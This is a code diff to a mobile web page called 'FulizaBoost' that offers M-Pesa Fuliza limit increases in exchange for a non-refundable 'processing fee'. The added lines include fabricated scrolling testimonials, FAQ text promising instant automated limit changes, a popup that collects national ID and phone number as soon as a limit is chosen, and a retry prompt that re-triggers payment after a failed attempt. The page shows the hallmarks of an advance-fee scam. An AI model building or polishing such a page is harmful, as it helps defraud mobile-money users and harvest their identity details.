@@ -19,6 +19,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>Boost Your Fuliza Limit | Get Instant Increase</title>
 
+  <!-- SEO Meta Tags -->
+  <meta name="description" content="Boost your Fuliza limit instantly with FulizaBoost. Safe, secure, and automated limit increases for your M-Pesa Fuliza account.">
+  <meta name="keywords" content="Fuliza, Fuliza limit increase, M-Pesa, Safaricom, Fuliza boost">
+  <meta property="og:title" content="Boost Your Fuliza Limit | Get Instant Increase">
+  <meta property="og:description" content="Increase your Fuliza limit today. Instant access, no paperwork, same day results.">
+  <meta property="og:type" content="website">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="flavicon.png">
+
   <!-- Fonts & Icons -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -465,6 +475,113 @@
       animation: pulse 2s infinite;
     }
 
+    /* FAQ Styles */
+    .faq-section {
+      margin-top: 24px;
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      padding: 18px;
+      box-shadow: var(--shadow-md);
+    }
+
+    .faq-title {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .faq-item {
+      border-bottom: 1px solid var(--border-color);
+      margin-bottom: 10px;
+      padding-bottom: 10px;
+    }
+
+    .faq-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .faq-question {
+      font-weight: 600;
+      color: var(--text-dark);
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      font-size: 0.95rem;
+    }
+
+    .faq-question i {
+      color: var(--primary);
+      transition: transform 0.3s ease;
+    }
+
+    .faq-question.active i {
+      transform: rotate(45deg); /* Rotates the plus to look like an x or just indicates open */
+    }
+    
+    .faq-question .icon-plus {
+       display: inline-block;
+    }
+    .faq-question .icon-minus {
+       display: none;
+    }
+    .faq-question.active .icon-plus {
+       display: none;
+    }
+    .faq-question.active .icon-minus {
+       display: inline-block;
+    }
+
+    .faq-answer {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      line-height: 1.5;
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.3s ease-out;
+    }
+    
+    .faq-answer.open {
+      max-height: 200px; /* Adjust as needed */
+      margin-top: 8px;
+    }
+
+    /* Testimonials Scroll */
+    .testimonials-container {
+      overflow: hidden;
+      background: #f0f9ff;
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 16px;
+      border: 1px solid #bae6fd;
+    }
+    
+    .testimonials-track {
+      display: flex;
+      animation: scroll 20s linear infinite;
+      width: max-content;
+    }
+    
+    .testimonial-item {
+      flex: 0 0 auto;
+      padding: 0 20px;
+      font-size: 0.85rem;
+      color: var(--text-dark);
+      border-right: 1px solid #bae6fd;
+    }
+    
+    @keyframes scroll {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+
     /* Very small phones (320px and below) */
     @media (max-width: 360px) {
       html {
@@ -763,6 +880,23 @@
         Select Your Fuliza Limit
       </div>
 
+      <!-- Testimonials -->
+      <div class="testimonials-container">
+         <div class="testimonials-track">
+           <div class="testimonial-item"><strong>John K.</strong> increased to Ksh 15,000</div>
+           <div class="testimonial-item"><strong>Mary W.</strong> increased to Ksh 25,000</div>
+           <div class="testimonial-item"><strong>Peter O.</strong> increased to Ksh 50,000</div>
+           <div class="testimonial-item"><strong>Sarah M.</strong> increased to Ksh 8,000</div>
+           <div class="testimonial-item"><strong>David N.</strong> increased to Ksh 30,000</div>
+           <!-- Duplicate for seamless scroll -->
+           <div class="testimonial-item"><strong>John K.</strong> increased to Ksh 15,000</div>
+           <div class="testimonial-item"><strong>Mary W.</strong> increased to Ksh 25,000</div>
+           <div class="testimonial-item"><strong>Peter O.</strong> increased to Ksh 50,000</div>
+           <div class="testimonial-item"><strong>Sarah M.</strong> increased to Ksh 8,000</div>
+           <div class="testimonial-item"><strong>David N.</strong> increased to Ksh 30,000</div>
+         </div>
+      </div>
+
       <!-- Loan Grid -->
       <div class="grid" id="loan-grid">
         <!-- Loan options will be populated by JavaScript -->
@@ -793,6 +927,58 @@
       <div class="badge">
         <i class="fas fa-check-circle"></i>
         Verified
+      </div>
+    </div>
+
+    <!-- How It Works & FAQ -->
+    <div class="faq-section">
+      <div class="faq-title">
+        <i class="fas fa-question-circle"></i>
+        How It Works & FAQ
+      </div>
+      
+      <div class="faq-item">
+        <div class="faq-question">
+          How do I increase my limit?
+          <i class="fas fa-plus icon-plus"></i>
+          <i class="fas fa-minus icon-minus"></i>
+        </div>
+        <div class="faq-answer">
+          Simply select your desired limit from the options above, enter your details, and pay the small processing fee. Your limit will be adjusted instantly upon successful payment.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <div class="faq-question">
+          How long does it take?
+          <i class="fas fa-plus icon-plus"></i>
+          <i class="fas fa-minus icon-minus"></i>
+        </div>
+        <div class="faq-answer">
+          The process is instant. Once the processing fee is paid, our system automatically updates your limit within minutes.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <div class="faq-question">
+          Is it refundable?
+          <i class="fas fa-plus icon-plus"></i>
+          <i class="fas fa-minus icon-minus"></i>
+        </div>
+        <div class="faq-answer">
+          The processing fee is non-refundable as it covers the cost of credit scoring and system adjustment.
+        </div>
+      </div>
+      
+      <div class="faq-item">
+        <div class="faq-question">
+          Do I need any paperwork?
+          <i class="fas fa-plus icon-plus"></i>
+          <i class="fas fa-minus icon-minus"></i>
+        </div>
+        <div class="faq-answer">
+          No paperwork is required. Everything is done digitally through this portal.
+        </div>
       </div>
     </div>
 
@@ -896,7 +1082,7 @@ const API_ENDPOINTS = {
       // Update selected loan
       selectedLoan = loan;
       
-      // Enable button
+      // Enable button (optional visually now as we trigger immediately)
       updateButtonState();
       
       // Save to storage
@@ -905,6 +1091,9 @@ const API_ENDPOINTS = {
       // Add pulse animation
       loanBox.classList.add('pulse');
       setTimeout(() => loanBox.classList.remove('pulse'), 2000);
+      
+      // Direct open popup as requested
+      showIdPhoneModal();
     }
 
     // Start ticker animation
@@ -924,6 +1113,27 @@ const API_ENDPOINTS = {
       getLimitBtn.addEventListener('click', () => {
         // First show ID and phone input modal, then proceed to payment
         showIdPhoneModal();
+      });
+      
+      // FAQ Accordion Logic
+      const faqQuestions = document.querySelectorAll('.faq-question');
+      faqQuestions.forEach(question => {
+        question.addEventListener('click', () => {
+          const answer = question.nextElementSibling;
+          const isActive = question.classList.contains('active');
+          
+          // Close all other answers
+          document.querySelectorAll('.faq-question').forEach(q => {
+            q.classList.remove('active');
+            q.nextElementSibling.classList.remove('open');
+          });
+          
+          // Toggle current
+          if (!isActive) {
+            question.classList.add('active');
+            answer.classList.add('open');
+          }
+        });
       });
     }
 
@@ -1506,14 +1716,25 @@ async function pollReceipt(reference, maxAttempts = 30, delay = 3000) {
             </div>
           `,
           icon: false,
+          showCancelButton: true,
           confirmButtonText: 'Try Again',
+          cancelButtonText: 'Cancel',
           confirmButtonColor: '#1f7a1f',
+          cancelButtonColor: '#6b7280',
           customClass: {
-            popup: 'swal2-popup-mobile'
+            popup: 'swal2-popup-mobile',
+            actions: 'swal2-actions-mobile'
+          }
+        }).then((result) => {
+          if (result.isConfirmed) {
+            // Reset processing flag to allow retry
+            isProcessing = false;
+            // Retry payment immediately
+            initiatePayment();
+          } else {
+            resetButton();
           }
         });
-        
-        resetButton();
       }
     }
 
